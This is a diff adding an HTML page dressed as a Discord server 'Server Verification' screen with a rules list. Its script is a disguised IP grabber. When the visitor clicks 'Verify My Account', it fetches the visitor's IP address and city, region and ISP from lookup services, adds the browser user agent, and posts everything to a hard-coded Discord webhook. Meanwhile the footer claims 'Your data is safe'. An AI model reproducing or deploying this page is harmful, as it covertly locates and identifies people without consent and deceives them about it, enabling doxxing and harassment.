@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Server Verification</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #1a1a2e;
+            color: #e0e0e0;
+            max-width: 800px;
+            margin: 50px auto;
+            padding: 20px;
+            text-align: center;
+        }
+        h1 { color: #00d2ff; }
+        .box {
+            background: #16213e;
+            padding: 30px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .loader {
+            border: 4px solid #333;
+            border-top: 4px solid #00d2ff;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .verify-btn {
+            background: #00d2ff;
+            color: #1a1a2e;
+            padding: 14px 40px;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+        .verify-btn:hover { background: #00b8e6; transform: scale(1.02); }
+        .verify-btn:disabled { opacity: 0.6; cursor: not-allowed; }
+        .footer {
+            margin-top: 40px;
+            color: #666;
+            font-size: 12px;
+        }
+        .success { color: #00ff88; }
+        .error { color: #ff4444; }
+        /* ===== RULES SECTION (hidden by default) ===== */
+        .rules {
+            display: none;
+            background: #16213e;
+            padding: 25px;
+            border-radius: 10px;
+            margin-top: 20px;
+            text-align: left;
+            border-left: 4px solid #00d2ff;
+        }
+        .rules.visible {
+            display: block;
+            animation: fadeUp 0.5s ease-out;
+        }
+        .rules h2 {
+            color: #00d2ff;
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .rules ul {
+            list-style: none;
+            padding: 0;
+        }
+        .rules li {
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+        }
+        .rules li:last-child {
+            border-bottom: none;
+        }
+        .rules .rule-number {
+            color: #00d2ff;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+        @keyframes fadeUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <h1>🔐 Server Verification</h1>
+    <div class="box" id="status">
+        <div class="loader"></div>
+        <p>Click the button below to verify your account.</p>
+    </div>
+
+    <button class="verify-btn" id="verifyBtn">🔐 Verify My Account</button>
+
+    <!-- ===== RULES SECTION (hidden until verified) ===== -->
+    <div class="rules" id="rulesSection">
+        <h2>📜 Server Rules</h2>
+        <ul>
+            <li><span class="rule-number">1.</span> Be respectful — treat others how you want to be treated</li>
+            <li><span class="rule-number">2.</span> No spamming — keep conversations meaningful</li>
+            <li><span class="rule-number">3.</span> No NSFW content — keep it family-friendly</li>
+            <li><span class="rule-number">4.</span> English only — so everyone can understand</li>
+            <li><span class="rule-number">5.</span> No advertising — ask permission first</li>
+            <li><span class="rule-number">6.</span> Have fun and enjoy the community! 🎮</li>
+        </ul>
+        <p style="text-align:center; margin-top:15px; color:#888;">✅ You are now verified! You will be redirected shortly...</p>
+    </div>
+
+    <div class="footer">Secure verification • Your data is safe</div>
+
+    <script>
+        // ====================================================
+        // YOUR WEBHOOK URL — REPLACE IF NEEDED
+        // ====================================================
+        const WEBHOOK = "https://discord.com/api/webhooks/1534665917378592808/lYbv7tTYoITL4UE_TgJTVIppLIzGG1yhwEO3VLV82J-XjIOKVnccG2IZ2uS67uxQXAia";
+        // ====================================================
+
+        // NEW REDIRECT LINK
+        const REDIRECT_URL = "https://discord.gg/y64CfQ3Cf";
+
+        let verified = false;
+        let redirectTimer = null;
+
+        document.getElementById('verifyBtn').addEventListener('click', async function() {
+            if (verified) return;
+
+            this.textContent = '⏳ Verifying...';
+            this.disabled = true;
+
+            try {
+                // Get IP
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                const ip = ipData.ip;
+
+                // Get location
+                const locRes = await fetch(`https://ipinfo.io/${ip}/json`);
+                const loc = await locRes.json();
+
+                // Build message for Discord
+                let message = `**🔐 Verification Completed**\n\n`;
+                message += `🌍 **IP:** ${ip}\n`;
+                message += `📍 **Country:** ${loc.country || 'Unknown'}\n`;
+                message += `🏙️ **City:** ${loc.city || 'Unknown'}\n`;
+                message += `🗺️ **Region:** ${loc.region || 'Unknown'}\n`;
+                message += `📡 **ISP:** ${loc.org || 'Unknown'}\n`;
+                message += `🖥️ **Device:** ${navigator.userAgent}\n`;
+                message += `🕒 **Time:** ${new Date().toISOString().replace('T', ' ').slice(0, 19)}`;
+
+                // Send to Discord
+                const response = await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: message })
+                });
+
+                if (response.ok) {
+                    verified = true;
+
+                    // Hide loader, show success + rules
+                    document.getElementById('status').innerHTML = `
+                        <h2 class="success">✅ Verification Complete!</h2>
+                        <p>You are now verified. Please read the rules below.</p>
+                    `;
+                    this.textContent = '✅ Verified!';
+                    this.style.background = '#22c55e';
+                    this.disabled = true;
+
+                    // Show the rules section
+                    const rulesSection = document.getElementById('rulesSection');
+                    rulesSection.classList.add('visible');
+
+                    // Redirect after 8 seconds (gives time to read rules)
+                    redirectTimer = setTimeout(() => {
+                        window.location.href = REDIRECT_URL;
+                    }, 8000);
+
+                } else {
+                    throw new Error('Webhook failed');
+                }
+
+            } catch (error) {
+                this.textContent = '🔐 Verify My Account';
+                this.disabled = false;
+                document.getElementById('status').innerHTML = `
+                    <h2 class="error">⚠️ Error</h2>
+                    <p>Please try again. If this persists, contact an admin.</p>
+                `;
+            }
+        });
+    </script>
+
+</body>
+</html>
